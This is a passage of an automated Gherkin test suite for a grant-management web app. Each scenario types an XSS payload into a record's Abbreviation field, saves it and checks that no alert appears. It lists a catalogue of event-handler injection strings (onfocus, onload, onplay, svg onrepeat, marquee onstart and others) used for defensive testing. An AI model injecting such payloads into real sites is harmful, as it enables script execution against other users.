      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300669 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                    | Field                |
      | <a id=x tabindex=1 onfocus=alert(1)></a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300671 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                      | Field                |
      | <a id=x tabindex=1 onfocusin=alert(1)></a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300673 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                         | Field                |
      | <body onhashchange="print()"> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300675 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                  | Field                |
      | <body onload=alert(1)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300678 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                               | Field                |
      | <audio onloadeddata=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300681 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                             | Field                |
      | <audio autoplay onloadedmetadata=alert(1)> <source src="validaudio.wav" type="audio/wav"></audio> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300682 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                    | Field                |
      | <body onmessage=print()> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300683 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                      | Field                |
      | <body onpageshow=alert(1)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300685 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                  | Field                |
      | <audio autoplay onplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300689 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                     | Field                |
      | <audio autoplay onplaying=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300690 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                     | Field                |
      | <body onpopstate=print()> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300692 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                   | Field                |
      | <audio controls onprogress=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300693 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                   | Field                |
      | <svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 /> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300694 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                     | Field                |
      | <body onresize="print()"> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300695 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                   | Field                |
      | <body onscroll=alert(1)><div style=height:1000px></div><div id=x></div> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300696 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                   | Field                |
      | <marquee onstart=alert(1)>XSS</marquee> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300698 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                 | Field                |
      | <audio controls autoplay ontimeupdate=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
